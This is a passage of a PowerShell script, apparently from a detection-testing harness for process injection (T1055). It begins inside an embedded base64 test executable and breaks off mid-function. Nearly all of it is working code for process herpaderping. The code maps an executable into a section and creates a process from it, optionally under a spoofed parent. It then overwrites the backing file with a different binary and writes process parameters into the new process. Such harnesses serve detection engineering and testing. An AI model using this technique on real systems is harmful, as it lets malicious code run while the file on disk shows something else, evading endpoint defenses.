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nEKcgpzCnQKdQp2CncKeAp5CnoKewp8Cn0Kfgp/CnAKgQqCCoMKhAqFCoYKhwqICokKigqLCowKjQqOCo8KgAqRCpIKkwqUCpUKlgqXCpgKmQqaCpsKnAqdCp4KnwqQCqAAAA4AAA+AAAAMig0KDYoBCjIKMwozijQKNIo1CjWKNgo2ijeKOAo4ijkKOYo6CjqKOwo8ij2KPoo/Cj+KMApAikeKWApYilkKXgpeil8KX4pQCmCKYQphimIKYopjCmOKZApkimUKZYpmCmaKZwpnimgKaIppCmmKagpqimsKa4psCmyKbQptim4KbopvCm+KYApwinEKcYpyCnKKcwp0CnSKdQp1inYKdop3CneKeAp4inkKeYp6CnqKewp7inwKfIp9Cn2Kfgp+in8Kf4pwCoCKgQqBioIKgoqDCoOKhAqEioUKhYqGCoaKhwqHiogKiIqJComKgAAADwAAAsAQAAcKJ4ooCiiKKQopiioKKoorCiuKLAosii0KLYouCi6KLwoviiAKMIozioSKhYqGioeKiIqJioqKi4qMio2KjoqPioCKkYqSipOKlIqVipaKl4qYipmKmoqbipyKnYqeip+KkIqhiqKKo4qkiqWKpoqniqiKqYqqiquKrIqtiq6Kr4qgirGKsoqzirSKtYq2ireKuIq5irqKu4q8ir2Kvoq/irCKwYrCisOKxIrFisaKx4rIismKyorLisyKzYrOis+KwIrRitKK04rUitWK1orXitiK2YraituK3Irdit6K34rQiuGK4orjiuSK5YrmiueK6IrpiuqK64rsiu2K7orviuCK8YryivOK9Ir1ivaK94r4ivmK+or7ivyK/Yr+iv+K8AAAAAAQDYAAAACKAYoCigOKBIoFigaKB4oIigmKCooLigyKDYoOig+KAIoRihKKE4oUihWKFooXihiKGYoaihuKHIodih6KH4oQiiGKIoojiiSKJYomiieKKIopiiqKK4osii2KLooviiCKMYoyijOKNIo1ijaKN4o4ijmKOoo7ijyKPYo+ij+KMIpBikKKQ4pEikWKRopHikiKSYpKikuKTIpNik6KT4pAilGKUopTilSKVYpWileKWIpZilqKW4pcil2KXopfilCKYYpiimOKZIplimaKYAAAAQAQC4AQAAkKKgorCiwKLQouCi8KIAoxCjIKMwo0CjUKNgo3CjgKOQo6CjsKPAo9Cj4KPwowCkEKQgpDCkQKRQpGCkcKSApJCkoKSwpMCk0KTgpPCkAKUQpSClMKVApVClYKVwpYClkKWgpbClwKXQpeCl8KUAphCmIKYwpkCmUKZgpnCmgKaQpqCmsKbAptCm4KbwpgCnEKcgpzCnQKdQp2CncKeAp5CnoKewp8Cn0Kfgp/CnAKgQqCCoMKhAqFCoYKhwqICokKigqLCowKjQqOCo8KgAqRCpIKkwqUCpUKlgqXCpgKmQqaCpsKnAqdCp4KnwqQCqEKogqjCqQKpQqmCqcKqAqpCqoKqwqsCq0KrgqvCqAKsQqyCrMKtAq1CrYKtwq4CrkKugq7CrwKvQq+Cr8KsArBCsIKwwrECsUKxgrHCsgKyQrKCssKzArNCs4KzwrACtEK0grTCtQK1QrWCtcK2ArZCtoK2wrcCt0K3grfCtAK4QriCuMK5ArlCuYK5wroCukK6grrCuwK7QruCu8K4ArxCvIK8wr0CvUK9gr3CvgK+Qr6CvsK/Ar9Cv4K/wrwAAACABACQAAAAAoBCgIKAwoECgUKBgoHCggKCQoKCgsKDAoAAAAEABABQAAABYpnCmeKYYpyCnKKcAYAEARAAAAICmyKbopginKKdIp3inkKeYp6Cn2Kfgp/Cn+KcAqAioEKgYqCCoKKgwqDioSKhQqFioYKhoqHCoeKiAqAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
    # Offset to the template GUID in the binary above. The template GUID will be replaced with the test GUID.
    $GuidOffset = 0x15050
    $UseTemplateExecutable = $False

    # Resolve the full path of the target file. Relative and absolute paths should be accepted.
    $TargetFileParentDirectory = Split-Path -Path $TargetFilePath -Parent
    $TargetFileFileName = Split-Path -Path $TargetFilePath -Leaf

    if (('' -eq $TargetFileParentDirectory) -or ('.' -eq $TargetFileParentDirectory)) {
        # Use the current working directory is an explicit directory is not supplied.
        $TargetFileParentDirectory = $PWD.Path
    }

    $ResolvedTargetFilePath = Join-Path -Path $TargetFileParentDirectory -ChildPath $TargetFileFileName

    $SHA256 = [Security.Cryptography.SHA256]::Create()

    switch ($PSCmdlet.ParameterSetName) {
        'File'                      { $ExecutionType = 'File' }
        'SourceAndReplacementBytes' { $ExecutionType = 'Memory' }
    }

    if ($SourceFilePath) {
        # Validate that the source executable exists
        if (-not (Test-Path -Path $SourceFilePath -PathType Leaf -IsValid)) {
            Write-Error "$SourceFilePath is not a valid file."
            return
        }

        # Resolve the full path to the source file.
        $ResolvedSourceFilePath = Resolve-Path -Path $SourceFilePath -ErrorAction Stop

        # Obtain the file bytes of the source file
        $SourceExeBytes = [IO.File]::ReadAllBytes($ResolvedSourceFilePath.Path)
        $SourceExePath = $ResolvedSourceFilePath
    } elseif (($ExecutionType -eq 'File') -and (-not $SourceFilePath)) {
        $SourceExeBytes = $TemplateSourceBytes

        $GuidBytes = [Text.Encoding]::Unicode.GetBytes($TestGuid)

        # Replace the template GUID "AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA" in the test executable with the test GUID.
        for ($i = 0; $i -lt $GuidBytes.Length; $i++) {
            $SourceExeBytes[($GuidOffset + $i)] = $GuidBytes[$i]
        }

        # Drop the test executable to the current directory for easy inspection.
        # Note: this will have a different hash after the template GUID is replaced.
        [IO.File]::WriteAllBytes("$PWD\test_executable.exe", $SourceExeBytes)
        $SourceExePath = "$PWD\test_executable.exe"

        $UseTemplateExecutable = $True
    } else {
        # Source file bytes were supplied.
        $SourceExeBytes = $SourceFileBytes
        $SourceExePath = $null
    }

    $SourceExeHash = ($SHA256.ComputeHash($SourceExeBytes) | ForEach-Object { $_.ToString('X2') }) -join ''

    if ($PSCmdlet.ParameterSetName -eq 'File') {
        # Validate that the replacement executable exists
        if (-not (Test-Path -Path $ReplacementFilePath -PathType Leaf)) {
            Write-Error "$ReplacementFilePath is not a valid file."
            return
        }

        # Resolve the full path to the source file.
        $ResolvedReplacementFilePath = Resolve-Path -Path $ReplacementFilePath -ErrorAction Stop

        $ReplacementExeBytes = [IO.File]::ReadAllBytes($ResolvedReplacementFilePath.Path)
        $ReplacementExePath = $ResolvedReplacementFilePath
    } else {
        $ReplacementExeBytes = $ReplacementFileBytes
        $ReplacementExePath = $null
    }

    $ReplacementExeHash = ($SHA256.ComputeHash($ReplacementExeBytes) | ForEach-Object { $_.ToString('X2') }) -join ''

    #region Validate source PE and obtain its address of entrypoint offset.
    $SourcePEInfo = Get-ExecutableMachineAndEntrypointRVA -ExeBytes $SourceExeBytes

    if (-not $SourcePEInfo) {
        Write-Error 'Source executable is not a valid portable executable (PE).'
        return
    } elseif ($SourcePEInfo.Machine -ne 0x8664) {
        Write-Error 'Source executable is not a 64-bit portable executable (PE).'
        return
    }

    $AddressOfEntryPointSource = $SourcePEInfo.AddressOfEntryPoint

    Write-Verbose "Address of entrypoint relative virtual address (RVA) for source executable: 0x$($AddressOfEntryPointSource.ToString('X8'))"

    $ReplacementPEInfo = Get-ExecutableMachineAndEntrypointRVA -ExeBytes $ReplacementExeBytes

    if (-not $ReplacementPEInfo) {
        Write-Error 'Replacement executable is not a valid portable executable (PE).'
        return
    } elseif ($ReplacementPEInfo.Machine -ne 0x8664) {
        Write-Error 'Replacement executable is not a 64-bit portable executable (PE).'
        return
    }
    #endregion

    # In order for the OS to validate the replacement file properly, it cannot be truncated
    # so the replacement file must be of equal or greater size than the source file.
    if ($SourceExeBytes.Length -gt $ReplacementExeBytes.Length) {
        Write-Error "Source file cannot exceed the size of the replacement file."
        return
    }
    
    # 64-bit offsets to use
    $ImageBaseAddressOffset  = 0x10
    $ProcessParametersOffset = 0x20
    $EnvironmentBlockOffset  = 0x80
    $EnvironmentSizeOffset   = 0x03F0

    Write-Verbose "Obtaining file handle for $ResolvedTargetFilePath."

    # Obtain a file handle to the target file, the executable that we will first write the source binary to, followed by the replacement binary.
    try {
        $TargetFileStream = [IO.File]::Open($ResolvedTargetFilePath, [IO.FileMode]::Create, [IO.FileAccess]::ReadWrite, $ShareMode)
    } catch {
        Write-Error $_
        return
    }

    try {
        $TargetFileStream.Write($SourceExeBytes, 0, $SourceExeBytes.Count)
    } catch {
        $TargetFileStream.Close()

        Write-Error $_
        return
    }

    if ($FlushFileBuffer) { $TargetFileStream.Flush() }

    $SECTION_ALL_ACCESS = 0x000F001F
    $PAGE_READONLY      = 0x00000002
    $SEC_IMAGE          = 0x01000000

    $SectionHandle = [IntPtr]::Zero
    $MaxSize = New-Object -TypeName AtomicTestHarnesses_T1055_UNK.LARGE_INTEGER

    Write-Verbose 'Creating a SEC_IMAGE memory section for the target process.'

    $Result = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::NtCreateSection(
        [Ref] $SectionHandle,
        $SECTION_ALL_ACCESS,
        ([IntPtr]::Zero),
        [Ref] $MaxSize,
        $PAGE_READONLY,
        $SEC_IMAGE,
        $TargetFileStream.SafeFileHandle.DangerousGetHandle()
    )

    if ($Result -ne 0) {
        $ErrorMessage = Get-NtStatusMessage -NTStatus $Result
        $ErrorString = "NtCreateSection failed. Error code: 0x$($Result.ToString('X8')). Reason: $ErrorMessage"

        $TargetFileStream.Close()

        Write-Error $ErrorString
        return
    }

    $PROCESS_ALL_ACCESS                   = 0x001FFFFF
    $PROCESS_CREATE_FLAGS_INHERIT_HANDLES = 0x00000004
    $PROCESS_DUP_HANDLE                   = 0x00000040
    $PROCESS_CREATE_PROCESS               = 0x00000080

    if ($ParentId) {
        $ParentProcHandle = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::OpenProcess(
            $PROCESS_CREATE_PROCESS -bor $PROCESS_DUP_HANDLE,   # processAccess - The minimum access rights required to spawn a child process.
            $False,                                             # bInheritHandle
            $ParentId                                           # processId - i.e. the process ID of the process we want to spawn a child process from
        );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if ($ParentProcHandle -eq [IntPtr]::Zero) {
            $ErrorString = "OpenProcess failed. Error code: 0x$($LastError.NativeErrorCode.ToString('X8')). Reason: $($LastError.Message)"

            $TargetFileStream.Close()

            Write-Error $ErrorString
            return
        }

        $ParentProcID = $ParentId
    } else {
        $ParentProcHandle = [IntPtr] -1
        $ParentProcID = $PID
    }

    $WMIParentProcessInfo = Get-CimInstance -ClassName Win32_Process -Property ExecutablePath, CommandLine -Filter "ProcessId = $ParentProcID"

    $ProcessHandle = [IntPtr]::Zero

    Write-Verbose 'Creating the target host process.'

    # Known issue: Attempting to start a 32-bit process will fail on a 64-bit OS.
    #   Expected NTSTATUS: 0xC000007B. Reason: "%1 is not a valid Win32 application."
    # Note: This supports specifying an alternate parent process.
    $Result = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::NtCreateProcessEx(
        [Ref] $ProcessHandle,
        $PROCESS_ALL_ACCESS,
        ([IntPtr]::Zero),
        $ParentProcHandle,
        $PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        $SectionHandle,
        ([IntPtr]::Zero),
        ([IntPtr]::Zero),
        $False
    )

    $null = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::NtClose($SectionHandle)

    if ($Result -ne 0) {
        $ErrorMessage = Get-NtStatusMessage -NTStatus $Result
        $ErrorString = "NtCreateProcessEx failed. Error code: 0x$($Result.ToString('X8')). Reason: $ErrorMessage"

        $TargetFileStream.Close()

        Write-Error $ErrorString
        return
    }

    $ProcessID = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::GetProcessId($ProcessHandle)

    Write-Verbose "Process object created. Process ID: $ProcessID"

    Write-Verbose "Copying replacement executable contents to open target file handle."

    $null = $TargetFileStream.Seek(0, 'Begin')

    $TargetFileStream.Write($ReplacementExeBytes, 0, $ReplacementExeBytes.Length)

    if ($FlushFileBuffer) { $TargetFileStream.Flush() }

    $CurrentProcessPEBAddress = Get-ProcessEnvironmentBlockAddress -ProcessHandle (Get-Process -Id $PID | Select-Object -ExpandProperty Handle)

    if (-not $CurrentProcessPEBAddress) {
        $null = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::NtClose($ProcessHandle)
        $TargetFileStream.Close()

        Write-Error 'Failed to obtain the process environment block address for the current process.'
        return
    }

    $TargetProcessPEBAddress  = Get-ProcessEnvironmentBlockAddress -ProcessHandle $ProcessHandle

    if (-not $TargetProcessPEBAddress) {
        $null = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::NtClose($ProcessHandle)
        $TargetFileStream.Close()

        Write-Error 'Failed to obtain the process environment block address for the target process.'
        return
    }

    Write-Verbose "PEB address for target process: 0x$($TargetProcessPEBAddress.ToString('X16'))"

    $BytesRead = 0
    $TargetImageBaseAddress = [IntPtr]::Zero
    $TargetImageBaseAddressPtr = [IntPtr]::Add($TargetProcessPEBAddress, $ImageBaseAddressOffset)

    $Result = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::ReadProcessMemory(
        $ProcessHandle,
        $TargetImageBaseAddressPtr,
        [Ref] $TargetImageBaseAddress,
        ([IntPtr]::Size),
        [Ref] $BytesRead
    );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if ($Result -eq $False) {
        $ErrorString = "ReadProcessMemory failed. Error code: 0x$($LastError.NativeErrorCode.ToString('X8')). Reason: $($LastError.Message)"

        $null = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::NtClose($ProcessHandle)
        $TargetFileStream.Close()

        Write-Error $ErrorString
        return
    }

    Write-Verbose "Image base address of target process: 0x$($TargetImageBaseAddress.ToString('X16'))"

    #region Initialize process parameters for the new process.
    # In other words, inform the OS what it is that actually needs to load.
    $ProcessParametersAddress = [Runtime.InteropServices.Marshal]::ReadIntPtr($CurrentProcessPEBAddress, $ProcessParametersOffset)

    $EnvironmentBlockAddress = [Runtime.InteropServices.Marshal]::ReadIntPtr($ProcessParametersAddress, $EnvironmentBlockOffset)

    $ProcessParameters = [IntPtr]::Zero

    if ($CommandLine) {
        $CommandLineString = New-UnicodeString -String $CommandLine
    } else {
        # Default to the target file path.
        $CommandLineString = New-UnicodeString -String "`"$TargetFilePath`""
    }

    $WindowTitleString = New-UnicodeString -String $TargetFilePath
    $ImagePathName     = New-UnicodeString -String $TargetFilePath
    $DesktopInfo       = New-UnicodeString -String 'WinSta0\Default'

    $Result = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::RtlCreateProcessParametersEx(
        [Ref] $ProcessParameters,
        [Ref] $ImagePathName,
        ([IntPtr]::Zero),
        ([IntPtr]::Zero),
        [Ref] $CommandLineString,
        $EnvironmentBlockAddress,
        [Ref] $WindowTitleString,
        [Ref] $DesktopInfo,
        ([IntPtr]::Zero),
        ([IntPtr]::Zero),
        0
    )

    if ($Result -ne 0) {
        $ErrorMessage = Get-NtStatusMessage -NTStatus $Result
        $ErrorString = "RtlCreateProcessParametersEx failed. Error code: 0x$($Result.ToString('X8')). Reason: $ErrorMessage"

        $null = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::NtClose($ProcessHandle)
        $TargetFileStream.Close()

        Write-Error $ErrorString
        return
    }
    
    # Calculate the space required to allocate the process parameters in the remote process.
    $ProcessParamsMaxLength = [Runtime.InteropServices.Marshal]::ReadInt32($ProcessParameters, 0)
    $ProcessParamsLength    = [Runtime.InteropServices.Marshal]::ReadInt32($ProcessParameters, 4)
    $EnvironmentBlockLength = [Runtime.InteropServices.Marshal]::ReadInt32($ProcessParameters, $EnvironmentSizeOffset)
    $TotalProcessParamsSize = $ProcessParamsMaxLength + $EnvironmentBlockLength
    #endregion

    $RemoteProcessParamsAddress = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::VirtualAllocEx(
        $ProcessHandle,
        ([IntPtr]::Zero),
        $TotalProcessParamsSize,
        0x3000, # MEM_COMMIT | MEM_RESERVE
        0x0004  # RAGE_READWRITE
    );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if ($RemoteProcessParamsAddress -eq [IntPtr]::Zero) {
        $ErrorString = "VirtualAllocEx failed. Error code: 0x$($LastError.NativeErrorCode.ToString('X8')). Reason: $($LastError.Message)"

        $null = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::NtClose($ProcessHandle)
        $TargetFileStream.Close()

        Write-Error $ErrorString
        return
    }

    Write-Verbose "Process parameter memory allocated in remote process at address: 0x$($RemoteProcessParamsAddress.ToString('X16'))"

    $RemoteEnvironmentBlockAddress = [IntPtr]::Add($RemoteProcessParamsAddress, $ProcessParamsLength)

    # Write the env block address where it will be located in the remote process to the local process block prior to writing it into the remote process.
    [Runtime.InteropServices.Marshal]::WriteIntPtr($ProcessParameters, $EnvironmentBlockOffset, $RemoteEnvironmentBlockAddress)

    Write-Verbose 'Writing process parameter block to remote process.'

    $BytesWritten = 0

    $Result = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::WriteProcessMemory(
        $ProcessHandle,
        $RemoteProcessParamsAddress,
        $ProcessParameters,
        $TotalProcessParamsSize,
        [Ref] $BytesWritten
    );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if ($Result -eq $False) {
        $ErrorString = "WriteProcessMemory failed. Error code: 0x$($LastError.NativeErrorCode.ToString('X8')). Reason: $($LastError.Message)"

